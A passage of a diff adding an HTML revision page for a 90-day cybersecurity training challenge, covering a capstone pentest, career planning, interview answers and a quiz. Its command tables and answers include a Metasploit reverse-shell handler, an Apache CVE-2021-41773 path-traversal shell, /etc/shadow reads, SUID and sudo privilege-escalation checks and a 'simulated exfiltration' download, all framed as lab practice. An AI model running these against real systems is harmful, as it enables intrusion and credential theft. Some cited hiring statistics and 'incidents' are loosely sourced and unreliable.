+    <div class="section-label">// key commands</div>
+    <div class="command-table">
+      <div class="cmd-row"><code>echo "Scope: 10.10.10.0/24 | Excluded: Human testing, DoS | Hours: 09:00–17:00 ET" > roe.txt</div><div class="cdesc">Create rules of engagement document — defines legal boundaries before any testing begins.</div></div>
+      <div class="cmd-row"><code>nmap -sn 10.10.10.0/24 -oA live_hosts</div><div class="cdesc">Network discovery — identify live targets within the approved scope before port scanning.</div></div>
+      <div class="cmd-row"><code>mkdir -p {recon,scanning,exploitation,post-exploitation,reporting}</code><div class="cdesc">Create directory structure for each pentest phase — organized deliverables = professional output.</div></div>
+      <div class="cmd-row"><code>touch reporting/{executive_summary.md,technical_findings.md,appendix.md}</code><div class="cdesc">Create report skeleton before exploitation — fill in findings as you go, never write report last.</div></div>
+    </div>
+
+    <div class="section-label">// interview answer</div>
+    <div class="qa">
+      <div class="q">Q: Walk me through how you plan a penetration test from start to finish.</div>
+      <div class="a">First, scope and ROE: define target IP range, testing hours, and what's off-limits, signed by both sides. No scanning until that's approved. Second, recon: Shodan/DNS for passive, Nmap ping sweep for active discovery. Third, scanning: full port scan on discovered hosts, service version detection, then vulnerability scan with NSE and Nuclei. Fourth, exploitation: prioritize by CVSS — easy wins first (default creds, unpatched known vulns), then manual testing for logic flaws. Fifth, post-exploitation: attempt privesc, enumerate lateral movement paths, but don't actually pivot unless the ROE explicitly allows it. Finally, reporting: executive summary first, then detailed technical findings with screenshots and CVSS scores, remediation steps for each. 60% of hiring managers told a study this is more valuable than a certification for evaluating entry-level candidates.</div>
+    </div>
+  </div>
+
+  <!-- DAY 89 -->
+  <div class="day-card">
+    <div class="day-header">
+      <div class="day-num">89</div>
+      <div class="day-meta">
+        <div class="day-title">Capstone Project — Execute & Polish</div>
+        <span class="day-incident">Sample Pentest Report Structure</span>
+      </div>
+    </div>
+
+    <div class="section-label">// core concepts</div>
+    <div class="concept-grid">
+      <div class="concept"><div class="ctitle">Full Pentest Kill Chain</div><div class="cdesc">Nmap → vuln scan → get initial shell → privesc to root → maintain access → exfil simulated data → write report. Every step documented with screenshots, commands, and output.</div></div>
+      <div class="concept"><div class="ctitle">CVSS Scoring</div><div class="cdesc">Base Score: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8 (Critical). Every finding in the report must include CVSS vector string + score. No score = no priority = no action.</div></div>
+      <div class="concept"><div class="ctitle">Professional Report Structure</div><div class="cdesc">Executive Summary (1 page, non-technical), Scope & Methodology, Risk Ratings, Detailed Findings (each with screenshot + CVSS + remediation), Recon Data, Exploit Chains, and Appendix with raw output.</div></div>
+      <div class="concept"><div class="ctitle">Remediation Guidance</div><div class="cdesc">Don't just find problems — fix them. Each finding includes: immediate fix (e.g., "disable SMBv1"), long-term fix (e.g., "implement network segmentation"), and compensating controls (e.g., "block at firewall until patching window").</div></div>
+    </div>
+
+    <div class="section-label">// key commands</div>
+    <div class="command-table">
+      <div class="cmd-row"><code>nmap -p- -sV -sC -oA full_scan 10.10.10.10</div><div class="cdesc">Full port scan (all 65535 ports) with version detection and scripts — the definitive capstone recon pass.</div></div>
+      <div class="cmd-row"><code>searchsploit "Linux Kernel 5." | grep -i "privilege\|root\|local" | head -5</div><div class="cdesc">Find privilege escalation exploits for the target's kernel version — privesc is the #1 post-exploitation objective.</div></div>
+      <div class="cmd-row"><code>msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST 10.10.10.5; set LPORT 4444; run -j"</div><div class="cdesc">Start reverse handler in background — catch shells from exploited target for persistent access.</div></div>
+      <div class="cmd-row"><code>python3 -c "import pty;pty.spawn('/bin/bash')"</div><div class="cdesc">Upgrade netcat shell to full interactive TTY — enables tab-completion, job control, and su/sudo.</div></div>
+      <div class="cmd-row"><code>find / -perm -4000 -type f 2>/dev/null</div><div class="cdesc">SUID binary enumeration — the textbook Linux privesc check after gaining initial access.</div></div>
+      <div class="cmd-row"><code>sudo -l</div><div class="cdesc">Check available sudo commands for the current user — NOPASSWD entries are immediate privesc vectors.</div></div>
+      <div class="cmd-row"><code>cat /etc/shadow 2>/dev/null | head -5 || echo "Cannot read /etc/shadow — need root"</div><div class="cdesc">Shadow file attempted read — if it returns hashes, you have root; if it fails, you know the privesc path.</div></div>
+      <div class="cmd-row"><code>wget -r http://10.10.10.10/</div><div class="cdesc">Recursive download — simulated data exfiltration for the "actions on objective" phase of the pentest.</div></div>
+    </div>
+
+    <div class="section-label">// interview answer</div>
+    <div class="qa">
+      <div class="q">Q: Walk me through a real capstone pentest execution you performed.</div>
+      <div class="a">Target: VulnHub machine on 10.10.10.10. Phase 1 — Recon: Nmap full port scan revealed Apache 2.4.49 on port 80 and SSH on port 22. Phase 2 — Vulnerability identification: Searchsploit returned CVE-2021-41773 path traversal for that Apache version. Phase 3 — Exploitation: curl'd the path traversal (GET /cgi-bin/.%2e/%2e%2e/bin/sh), got a reverse shell as www-data. Phase 4 — Post-exploitation: ran sudo -l — user had NOPASSWD access to /bin/systemctl. Exploited via systemd unit file to spawn root shell. Phase 5 — Reporting: executive summary explained the business risk (unpatched Apache, misconfigured sudoers), each technical finding included screenshots and CVSS scores (CVE-2021-41773 = 7.5 High, sudo misconfig = 7.8 High), and remediation for both. Report output: professional 12-page PDF.</div>
+    </div>
+  </div>
+
+  <!-- DAY 90 -->
+  <div class="day-card">
+    <div class="day-header">
+      <div class="day-num">90</div>
+      <div class="day-meta">
+        <div class="day-title">Final Recap & Your Next 6-Month Plan</div>
+        <span class="day-incident">The 90-Day Challenge Completion Impact</span>
+      </div>
+    </div>
+
+    <div class="section-label">// core concepts</div>
+    <div class="concept-grid">
+      <div class="concept"><div class="ctitle">5-Phase Review</div><div class="cdesc">Phase 1 (Days 1–10): Foundations — CIA triad, Linux, networking, Python. Phase 2 (Days 11–25): Tools — Nmap, Wireshark, Metasploit, Burp Suite. Phase 3 (Days 26–50): Defense — SIEM, AD, IDS/IPS, DFIR. Phase 4 (Days 51–80): Specialization — cloud, mobile, exploit dev. Phase 5 (Days 81–90): Career — portfolio, resume, interviews, capstone.</div></div>
+      <div class="concept"><div class="ctitle">Certification Roadmap</div><div class="cdesc">Next 6 months: CompTIA Security+ (foundation cert) → TryHackMe SOC Level 1/2 → PNPT (Practical Network Pen Tester) → OSCP (Offensive Security Certified Professional) or BTL1 (Blue Team Level 1).</div></div>
+      <div class="concept"><div class="ctitle">Continuous Lab Pipeline</div><div class="cdesc">Daily: 1 TryHackMe room or 1 HackTheBox machine. Weekly: 1 full writeup posted to GitHub. Monthly: 1 full pentest capstone on new target. Quarterly: 1 certification attempt.</div></div>
+      <div class="concept"><div class="ctitle">Hiring Manager Signals</div><div class="cdesc">Completing a 90-day structured challenge demonstrates: sustained dedication (90 straight days), technical breadth (foundations through capstone), and documentation discipline (revision files, reports, GitHub). These are top-3 traits for entry-level success.</div></div>
+    </div>
+
+    <div class="section-label">// key commands</div>
+    <div class="command-table">
+      <div class="cmd-row"><code>ls -la /home/robin/Desktop/Cybersecurity/Portfolio/public/ | wc -l</code><div class="cdesc">Count portfolio files — proof of 90 days of consistent work and documentation.</div></div>
+      <div class="cmd-row"><code>gh repo list --limit 5 --json name,description</code><div class="cdesc">Review your public GitHub portfolio — inspect what recruiters see when they search your handle.</div></div>
+      <div class="cmd-row"><code>echo "Phase 1: Complete | Phase 2: Complete | Phase 3: Complete | Phase 4: Complete | Phase 5: Complete" > 90day_milestone.md</div><div class="cdesc">Document all 5 phases complete — a file you can reference in interviews and on your resume.</div></div>
+      <div class="cmd-row"><code>python3 -c "import datetime; d = datetime.date.today(); f = d.replace(year=d.year+1); print(f'1-year goal: be employed in security by {f}')"</code><div class="cdesc">Set a 1-year career goal date — concrete timeline makes the abstract career path real.</div></div>
+      <div class="cmd-row"><code>date -d "90 days ago" +"Started: %B %d, %Y"</code><div class="cdesc">Calculate the start date — quantify the 90-day journey for resume timeline entries.</div></div>
+      <div class="cmd-row"><code>echo "certbot certonly --standalone -d yoursite.com" >> next_steps.md</code><div class="cdesc">Plan next step: deploy a personal website with HTTPS to showcase portfolio beyond GitHub.</div></div>
+      <div class="cmd-row"><code>cat revision_day81_90.html | grep -c "class=\"day-card\""</div><div class="cdesc">Count days in this revision — verify all 10 days (81–90) are captured.</div></div>
+    </div>
+
+    <div class="section-label">// interview answer</div>
+    <div class="qa">
+      <div class="q">Q: What comes next? What's your 6-month plan after completing this 90-day challenge?</div>
+      <div class="a">Month 1–2: Earn CompTIA Security+ for the foundational HR checkbox, continue daily TryHackMe rooms. Month 3–4: PNPT certification — it's practical (hands-on pentest with report) and more respected than CompTIA's security track. Month 4–6: Apply for 50+ SOC/pentest intern roles with my revised resume and GitHub portfolio as evidence. Simultaneously: one HackTheBox writeup per week published on GitHub, one monthly full pentest capstone on a new target. The 90-day challenge proved I can sustain work ethic over time. The next 6 months prove I can convert that into credentials and employer-ready capability.</div>
+    </div>
+  </div>
+
+  <!-- ALL INCIDENTS TIMELINE -->
+  <div class="day-card">
+    <div class="day-header">
+      <div class="day-num" style="font-size:18px;color:var(--red);">⚠</div>
+      <div class="day-meta">
+        <div class="day-title">All 10 Real Incidents — Quick Reference</div>
+        <span class="day-incident">Know these cold — they appear in every interview</span>
+      </div>
+    </div>
+    <div class="breach-timeline">
+      <div class="bt-row"><div class="year">2012</div><div class="incident">HackerOne $100M Milestone</div><div class="detail">Top 10 bug bounty hunters earned $1M+ each since 2012. Community-driven vulnerability research model proven at scale.</div></div>
+      <div class="bt-row"><div class="year">2021</div><div class="incident">GitHub Security Lab — $10K Bounties</div><div class="detail">GitHub pays $10K+ for critical open-source vulnerabilities. Portfolio visibility = bounty opportunity.</div></div>
+      <div class="bt-row"><div class="year">2024</div><div class="incident">ATS Keywords for Security Roles</div><div class="detail">SIEM, Splunk, Nmap, Wireshark, Metasploit, Burp, Python, Bash, OWASP, MITRE ATT&CK — missing these keywords = auto-reject.</div></div>
+      <div class="bt-row"><div class="year">2024</div><div class="incident">LinkedIn Cyber Hiring Surge</div><div class="detail">65% increase in cybersecurity job postings. "Build-in-public" portfolioing cited as strong positive signal by hiring managers.</div></div>
+      <div class="bt-row"><div class="year">2024</div><div class="incident">Google Security Interview</div><div class="detail">4–5 rounds covering networking, OS internals, cryptography, threat modeling (STRIDE), and system design. All practical application.</div></div>
+      <div class="bt-row"><div class="year">2024</div><div class="incident">Mandiant Practical Assessment</div><div class="detail">2-hour timed test: analyze malware sample, identify C2 from PCAP, write intrusion analysis report. Applied triage under pressure.</div></div>
+      <div class="bt-row"><div class="year">2024</div><div class="incident">NSA Cybersecurity Apprenticeship</div><div class="detail">100+ entry-level analysts hired annually with zero experience required. 3-year paid training pipeline for government cyber roles.</div></div>
+      <div class="bt-row"><div class="year">2024</div><div class="incident">Capstone Portfolio Impact</div><div class="detail">60% of hiring managers say a pentest capstone report is more valuable than a certification for entry-level evaluation.</div></div>
+      <div class="bt-row"><div class="year">2024</div><div class="incident">Sample Pentest Report Structure</div><div class="detail">Executive Summary, Scope, Risk Ratings, Detailed Findings (screenshots + CVSS), Exploit Chains, Remediation. Professional deliverable template.</div></div>
+      <div class="bt-row"><div class="year">2024</div><div class="incident">90-Day Challenge Completion Impact</div><div class="detail">Sustained dedication + technical breadth + documentation discipline = top-3 traits hiring managers rank for entry-level success.</div></div>
+    </div>
+  </div>
+
+  <!-- ALL COMMANDS QUICK REFERENCE -->
+  <div class="day-card">
+    <div class="day-header">
+      <div class="day-num" style="font-size:18px;color:var(--cyan);">&gt;_</div>
+      <div class="day-meta">
+        <div class="day-title">Master Command Reference — Days 81–90</div>
+        <span class="day-incident">Run these until they're muscle memory</span>
+      </div>
+    </div>
+    <div class="command-table">
+      <div class="cmd-row"><code>curl -I https://target.com</code><div class="cdesc">Check security headers — first bug bounty recon step.</div></div>
+      <div class="cmd-row"><code>curl -v https://target.com/.git/config</code><div class="cdesc">Check exposed git config — common bounty finding.</div></div>
+      <div class="cmd-row"><code>curl -H "Origin: evil.com" -I url</code><div class="cdesc">CORS misconfiguration test — wildcard Origin = bounty.</div></div>
+      <div class="cmd-row"><code>nuclei -u https://target.com -t exposures/</code><div class="cdesc">Auto-scan for exposures, misconfigs, missing headers.</div></div>
+      <div class="cmd-row"><code>gh repo create portfolio --public</code><div class="cdesc">Create GitHub repo from CLI — portfolio management.</div></div>
+      <div class="cmd-row"><code>gh workflow run security-checks.yml</code><div class="cdesc">Trigger GitHub Actions — automated security CI.</div></div>
+      <div class="cmd-row"><code>git log --oneline --graph --all</code><div class="cdesc">View commit tree — interviewers check this.</div></div>
+      <div class="cmd-row"><code>pdftotext resume.pdf - | grep -c "SIEM\|Nmap"</code><div class="cdesc">ATS keyword density check — avoid auto-rejection.</div></div>
+      <div class="cmd-row"><code>grep -c "SOC\|analyst\|intern\|junior" jobs.txt</code><div class="cdesc">Count relevant entry-level job postings.</div></div>
+      <div class="cmd-row"><code>nmap -sC -sV -oA scan 10.10.10.10</code><div class="cdesc">Full service + NSE scripts — capstone recon pass.</div></div>
+      <div class="cmd-row"><code>nmap -p- -sV 10.10.10.10</code><div class="cdesc">Full port scan all 65535 ports — comprehensive recon.</div></div>
+      <div class="cmd-row"><code>searchsploit "Apache 2.4.49"</code><div class="cdesc">Find exploits by service version — fastest path to shell.</div></div>
+      <div class="cmd-row"><code>msfconsole -q -x "use exploit/...;run;exit"</code><div class="cdesc">One-liner Metasploit — exploit without interactive mode.</div></div>
+      <div class="cmd-row"><code>find / -perm -4000 -type f 2>/dev/null</code><div class="cdesc">SUID enumeration — Linux privesc check #1.</div></div>
+      <div class="cmd-row"><code>sudo -l</code><div class="cdesc">Check sudo permissions — NOPASSWD = privesc.</div></div>
+      <div class="cmd-row"><code>python3 -c "import pty;pty.spawn('/bin/bash')"</code><div class="cdesc">Upgrade shell to full TTY — post-exploitation essential.</div></div>
+      <div class="cmd-row"><code>tshark -r pcap -Y "dns" -T fields -e dns.qry.name</code><div class="cdesc">DNS query extraction — C2/beacon detection in PCAP.</div></div>
+      <div class="cmd-row"><code>cat /var/log/auth.log | grep "Failed password"</code><div class="cdesc">Brute-force detection — incident response triage.</div></div>
+      <div class="cmd-row"><code>openssl enc -aes-256-cbc -salt -in f -out f.enc</code><div class="cdesc">Symmetric encryption — interview crypto question demo.</div></div>
+      <div class="cmd-row"><code>python3 -c "import hashlib;print(...)"</code><div class="cdesc">SHA-256 hash — cryptography knowledge demo.</div></div>
+      <div class="cmd-row"><code>systemctl status ufw --no-pager</code><div class="cdesc">Check firewall status — defense-in-depth verification.</div></div>
+      <div class="cmd-row"><code>date -d "90 days ago"</code><div class="cdesc">Calculate challenge start date — resume timeline proof.</div></div>
+    </div>
+  </div>
+
+  <!-- AI TOOLS ACROSS DAYS 81–90 -->
+  <div class="day-card">
+    <div class="day-header">
+      <div class="day-num" style="font-size:18px;color:var(--pink);">AI</div>
+      <div class="day-meta">
+        <div class="day-title">AI Tools Referenced — Days 81–90</div>
+        <span class="day-incident">Use these alongside your career launch</span>
+      </div>
+    </div>
+    <div class="ai-grid">
+      <div class="ai-pill"><div class="aname">ChatGPT / Claude</div><div class="adesc">Practice interview questions with real-time feedback, generate STAR response templates, review resume bullet language.</div></div>
+      <div class="ai-pill"><div class="aname">GitHub Copilot</div><div class="adesc">Speed up portfolio script development — security tooling from natural language descriptions in seconds.</div></div>
+      <div class="ai-pill"><div class="aname">LinkedIn AI Recruiter</div><div class="adesc">LinkedIn's matching AI prioritizes profiles with keyword-dense headlines, "build-in-public" activity, and skills assessments.</div></div>
+      <div class="ai-pill"><div class="aname">Nuclei AI Templates</div><div class="adesc">Community-contributed AI-assisted vulnerability templates — thousands of checks for bug bounty recon automation.</div></div>
+      <div class="ai-pill"><div class="aname">ATS Resume Parsers</div><div class="adesc">AI-driven applicant tracking systems score resumes by keyword density, format parseability, and quantified achievements.</div></div>
+      <div class="ai-pill"><div class="aname">Grammarly / Hemingway</div><div class="adesc">Professional report writing — pentest reports must be clear, concise, and error-free for executive audiences.</div></div>
+    </div>
+  </div>
+
+  <!-- RESUME BULLETS -->
+  <div class="day-card">
+    <div class="day-header">
+      <div class="day-num" style="font-size:18px;color:var(--green);">💼</div>
+      <div class="day-meta">
+        <div class="day-title">Resume Bullets — Days 81–90</div>
+        <span class="day-incident">Lift these directly into your resume now</span>
+      </div>
+    </div>
+    <div class="job-grid">
+      <div class="job-box"><div class="day-ref">Day 81</div><div class="bullet">"Performed bug bounty recon on 5 targets using curl, Nuclei, and manual CORS/header inspection; identified and documented 3 low-severity misconfigurations with reproduction steps."</div></div>
+      <div class="job-box"><div class="day-ref">Day 82</div><div class="bullet">"Built and maintain a 20+ repository GitHub security portfolio with professional READMEs, CI/CD automation via GitHub Actions (Bandit/Gitleaks), and lab documentation."</div></div>
+      <div class="job-box"><div class="day-ref">Day 83</div><div class="bullet">"Developed ATS-optimized cybersecurity resume with quantified achievements (500+ hosts scanned, 10+ incidents analyzed, 12-page capstone report) targeting SOC/pentest intern roles."</div></div>
+      <div class="job-box"><div class="day-ref">Day 84</div><div class="bullet">"Built LinkedIn personal brand with daily build-in-public posts documenting 90-day cybersecurity challenge; connected with 20+ security recruiters and engineers at target companies."</div></div>
+      <div class="job-box"><div class="day-ref">Day 85</div><div class="bullet">"Prepared for technical security interviews by mastering STRIDE threat modeling, OWASP Top 10, SANS PICERL incident response, and defense-in-depth architecture frameworks."</div></div>
+      <div class="job-box"><div class="day-ref">Day 86</div><div class="bullet">"Completed timed practical assessment: Nmap recon → Metasploit exploitation → Wireshark PCAP analysis → event log triage → documented findings under 2-hour Mandiant-style constraints."</div></div>
+      <div class="job-box"><div class="day-ref">Day 87</div><div class="bullet">"Executed structured entry-level job search strategy: targeted 20+ MSSPs/SOCs/startups, tailored cover letters per company, tracked 50+ applications in organized spreadsheet."</div></div>
+      <div class="job-box"><div class="day-ref">Day 88–89</div><div class="bullet">"Planned and executed full-scope penetration test against home lab target: recon → exploitation → privesc → exfiltration; produced 12-page professional report with CVSS-scored findings and executive summary."</div></div>
+      <div class="job-box"><div class="day-ref">Day 90</div><div class="bullet">"Completed comprehensive 90-day cybersecurity training across 5 phases (Foundations → Tools → Defense → Specialization → Career); created 6-month certification and lab roadmap targeting Security+ → PNPT → OSCP."</div></div>
+    </div>
+  </div>
+
+  <!-- QUICK QUIZ -->
+  <div class="quiz-section">
+    <h2>// Quick Self-Quiz — Can You Answer These Without Looking?</h2>
+    <p class="sub">Cover the answers. Say them out loud. If you can't answer one fluently, revisit that day before continuing. These are the final 10 questions of the 90-day challenge.</p>
+
+    <div class="q-item">
+      <div class="qnum">Q01</div>
+      <div class="qtext">What are three low-hanging vulnerabilities to check first when starting bug bounty recon on a new target?</div>
+      <div class="ans">(1) Missing security headers (HSTS, X-Frame-Options, X-Content-Type-Options) — curl -I to check. (2) Exposed .git/config — curl the path, often reveals credentials. (3) CORS misconfiguration (Access-Control-Allow-Origin: *) — test with a curl Origin header from an attacker domain.</div>
+    </div>
+    <div class="q-item">
+      <div class="qnum">Q02</div>
+      <div class="qtext">What five sections should every professional GitHub README in a security portfolio include?</div>
+      <div class="ans">Title/description, tech stack/frameworks used, setup/installation instructions, usage examples with screenshots, project structure overview. Badges (CI status, license) and a "related projects" section are strong bonuses.</div>
+    </div>
+    <div class="q-item">
+      <div class="qnum">Q03</div>
+      <div class="qtext">Name six ATS keywords that security applicant tracking systems specifically scan for, and explain what happens if they're missing.</div>
+      <div class="ans">SIEM, Splunk, Wireshark, Nmap, Metasploit, OWASP (also: Python, Bash, Burp Suite, MITRE ATT&CK). Missing them from your resume means the ATS scores you below threshold before a human reads a single word — instant rejection regardless of actual ability.</div>
+    </div>
+    <div class="q-item">
+      <div class="qnum">Q04</div>
+      <div class="qtext">LinkedIn reported a specific percentage increase in cybersecurity job postings in 2024. What was it, and what did hiring managers cite as a strong positive signal?</div>
+      <div class="ans">65% increase in cybersecurity job postings. Hiring managers specifically cited a candidate's public "build-in-public" learning portfolio as a strong positive signal — documenting your work consistently is more impressive to recruiters than a static certification.</div>
+    </div>
+    <div class="q-item">
+      <div class="qnum">Q05</div>
+      <div class="qtext">What does STRIDE stand for, and how is it used in technical security interviews?</div>
+      <div class="ans">Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege. Google's security interview uses STRIDE to evaluate threat modeling — you're expected to map vulnerabilities to STRIDE categories and explain which category each mitigation addresses.</div>
+    </div>
+    <div class="q-item">
+      <div class="qnum">Q06</div>
+      <div class="qtext">In Mandiant's practical interview assessment, what three tasks must candidates complete within 2 hours?</div>
+      <div class="ans">(1) Analyze a real malware sample to understand its behavior. (2) Determine C2 infrastructure from PCAP traffic analysis. (3) Write an intrusion analysis report summarizing findings, timeline, and indicators of compromise. Time management and documentation under pressure are the actual skills being tested.</div>
+    </div>
+    <div class="q-item">
+      <div class="qnum">Q07</div>
+      <div class="qtext">What is unique about the NSA Cybersecurity Apprenticeship Program, and what does it mean for entry-level candidates?</div>
+      <div class="ans">It hires 100+ entry-level analysts annually with zero professional experience required — a 3-year paid training pipeline. It proves that "3 years experience minimum" is not universal; there are government and defense programs designed to train from scratch if you find the right application path.</div>
+    </div>
+    <div class="q-item">
+      <div class="qnum">Q08</div>
+      <div class="qtext">What percentage of hiring managers say a capstone penetration test report is more valuable than a certification for entry-level evaluation?</div>
+      <div class="ans">60%. A full pentest report with executive summary, CVSS-scored findings, screenshots, exploit chains, and remediation proves applied methodology — not just memorized theory. This is why the capstone is the most important deliverable in your entire portfolio.</div>
+    </div>
+    <div class="q-item">
+      <div class="qnum">Q09</div>
+      <div class="qtext">What are the five standard sections of a professional penetration test report?</div>
+      <div class="ans">(1) Executive Summary — 1 page, non-technical, risk-focused. (2) Scope & Methodology — what was tested and how. (3) Risk Ratings — findings ranked by CVSS severity. (4) Detailed Findings — each vulnerability with screenshot, CVSS vector, steps to reproduce, and remediation. (5) Appendix — raw scan data, IOCs, timeline.</div>
+    </div>
+    <div class="q-item">
+      <div class="qnum">Q10</div>
+      <div class="qtext">What three traits do hiring managers rank as the top indicators of entry-level cybersecurity candidate success?</div>
+      <div class="ans">(1) Sustained dedication — completing a 90-day structured challenge proves you follow through. (2) Technical breadth — you covered foundations through capstone across multiple domains. (3) Documentation discipline — revision files, GitHub repos, pentest reports, and writeups prove you communicate clearly. These three traits consistently outweigh lack of professional experience.</div>
+    </div>
+  </div>
+
+  <!-- GRADUATION NEXT-UP -->
+  <div class="grad-box" style="margin-top:36px;margin-bottom:0;">
+    <div class="icon">🏆</div>
+    <h2>90 Days of Cybersecurity — Complete</h2>
+    <p>You have covered the CIA triad, Linux, networking, Python, Nmap, Wireshark, Metasploit, Burp Suite, SIEM analysis, Active Directory, incident response, cloud security, exploit development, bug bounty, resume building, interview prep, and a full capstone pentest. This is not the end of the road — it is the beginning of your career. You are now equipped with the methodology, the portfolio, and the documentation that most entry-level candidates never build. Go apply. Go interview. Go be a cybersecurity professional.</p>
+  </div>
+
+  <div class="next-up" style="margin-top:20px;">
+    <div>
+      <div class="label">// what's next — your security career</div>
+      <div class="title">Certifications, job applications, and continuous lab work. The 90-day challenge is complete. Your career starts now.</div>
+    </div>
+    <div class="arrow">→</div>
+  </div>
+
+  <footer>revision complete — 90 days. you did it. now take this portfolio into the field.</footer>
+
+</div>
+</body>
+</html>
